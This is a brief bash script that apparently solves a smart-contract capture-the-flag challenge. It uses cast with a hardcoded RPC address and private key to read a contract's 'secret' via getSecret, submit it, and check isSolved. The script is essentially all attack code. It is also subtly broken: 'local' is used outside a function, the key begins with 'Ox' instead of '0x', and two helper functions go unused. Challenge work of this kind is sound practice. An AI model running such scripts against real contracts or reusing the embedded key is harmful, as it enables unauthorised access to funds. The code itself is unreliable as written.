#!/bin/bash
set -x

_x(){ local a="$1";shift;eval "$a=\"$*\""; }
_y(){ eval "local $1"; }

eval RPC_SRC="http://108.137.70.166:46716/747b1414-a3d6-4915-8006-7427dce3bc90"
eval PRIV_K="Oxe9af35f7dc3e098295311cdac0462ec56bfa1a5986d51fac47167a5b1f6de9d9"
eval CNTR="0x5BAdbfC9016fD335BcFe27f14fF5F0BCF587f2E9"

local sec_addr=$(cast call "$CNTR" "mizuharaSecret() view returns(address)" --rpc-url "$RPC_SRC" --private-key "$PRIV_K")
local sec_val=$(cast call "$sec_addr" "getSecret(uint256,uint256)" 1337 0 --rpc-url "$RPC_SRC")
cast send "$sec_addr" --rpc-url "$RPC_SRC" --private-key "$PRIV_K" "submitSecret(uint256)" "$sec_val"

local ye_solved=$(cast call "$CNTR" "isSolved()" --rpc-url "$RPC_SRC" --private-key "$PRIV_K")
[[ "$ye_solved" != "0x0000000000000000000000000000000000000000000000000000000000000000" ]] && {
 echo "Yayy >_<"; 
 exit 0;
}
